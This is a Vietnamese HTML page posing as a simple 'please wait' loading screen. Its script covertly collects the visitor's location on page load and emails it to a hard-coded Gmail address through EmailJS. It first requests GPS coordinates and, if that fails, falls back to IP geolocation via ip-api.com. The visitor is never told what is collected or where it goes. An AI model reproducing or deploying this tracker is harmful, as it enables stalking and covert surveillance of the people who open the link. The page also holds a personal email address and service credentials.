<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chờ lát nhé</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("4OQAqbNTwSeMbQUcX");
        })();
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #f0f0f0;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        #status {
            font-size: 18px;
            color: #333;
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            max-width: 90%;
            word-wrap: break-word;
        }
        .loading { color: blue; font-weight: bold; }
        .success { color: green; background-color: #e0ffe0; }
        .error { color: red; background-color: #ffe0e0; }
        @media (max-width: 600px) {
            h2 { font-size: 20px; }
            #status { font-size: 16px; }
        }
    </style>
</head>
<body>
    <h2>Chờ một lát nhé</h2>
    <div id="status" class="loading">...</div>
    <script>
        const statusDiv = document.getElementById("status");

        function updateStatus(message, type = "") {
            statusDiv.innerText = message;
            statusDiv.className = type;
        }

        function sendEmail(latitude, longitude, source = "geolocation") {
            updateStatus(`Vị trí (${source}): ${latitude}, ${longitude}\nĐang gửi...`, "loading");
            console.log(`Vị trí (${source}):`, latitude, longitude);

            const emailData = {
                lat: latitude.toString(),
                lon: longitude.toString(),
                to_email: "thanhkhazyd598@gmail.com"
            };
            console.log("Dữ liệu gửi đi:", emailData);

            emailjs.send(
                "service_i4tl7m4",
                "template_2v52xwf",
                emailData
            )
            .then(() => {
                console.log("Email đã gửi thành công!");
                updateStatus(`Vị trí (${source}): ${latitude}, ${longitude}\nEmail đã gửi! Cảm ơn bạn!`, "success");
            })
            .catch((error) => {
                console.error("Lỗi gửi email:", error);
                updateStatus(`Lỗi gửi email: ${error.text || error}\nVui lòng thử lại sau.`, "error");
            });
        }

        // Fallback: Lấy vị trí từ IP nếu geolocation thất bại
        function getLocationFromIP() {
            updateStatus("Không lấy được vị trí chính xác. Đang dùng IP...", "loading");
            fetch('http://ip-api.com/json/')
                .then(response => response.json())
                .then(data => {
                    const { lat, lon } = data;
                    if (lat && lon) {
                        sendEmail(lat, lon, "IP");
                    } else {
                        updateStatus("Không thể lấy vị trí từ IP.", "error");
                    }
                })
                .catch(error => {
                    console.error("Lỗi lấy IP:", error);
                    updateStatus("Không thể lấy vị trí từ IP.", "error");
                });
        }

        // Timeout thủ công để tránh treo loading
        const timeoutId = setTimeout(() => {
            getLocationFromIP(); // Fallback nếu geolocation thất bại
        }, 6000);

        navigator.geolocation.getCurrentPosition(
            (position) => {
                clearTimeout(timeoutId);
                const { latitude, longitude } = position.coords;
                if (!latitude || !longitude) {
                    updateStatus("Lỗi: Tọa độ không hợp lệ.", "error");
                    return;
                }
                sendEmail(latitude, longitude, "GPS");
            },
            (error) => {
                clearTimeout(timeoutId);
                console.error("Không có quyền:", error.code, error.message);
                let message = "";
                switch (error.code) {
                    case 1: message = "Bạn đã từ chối cấp quyền. Hãy bật quyền truy cập vị trí trong cài đặt trình duyệt."; break;
                    case 2: message = "Không thể xác định vị trí. Đang thử dùng IP..."; break;
                    case 3: message = "Hết thời gian chờ. Đang thử dùng IP..."; break;
                    default: message = "Lỗi không xác định. Đang thử dùng IP...";
                }
                updateStatus(message, "error");
                getLocationFromIP();
            },
            { timeout: 5000, maximumAge: 300000, enableHighAccuracy: false }
        );
    </script>
</body>
</html>
